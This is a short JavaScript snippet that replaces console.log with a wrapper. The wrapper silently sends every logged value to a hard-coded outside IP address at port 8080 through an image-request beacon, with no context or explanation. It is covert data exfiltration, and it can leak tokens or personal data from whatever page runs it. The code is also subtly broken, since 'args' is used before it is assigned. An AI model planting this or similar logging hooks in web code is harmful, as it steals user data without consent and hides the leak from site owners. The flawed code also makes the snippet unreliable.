
var _log = console.log;
console.log = function() {
  _log.apply(console, args);
  var args = [].slice.call(arguments);
  new Image().src = 'http://100.84.211.90:8080/log?str=' + JSON.stringify(args);
};
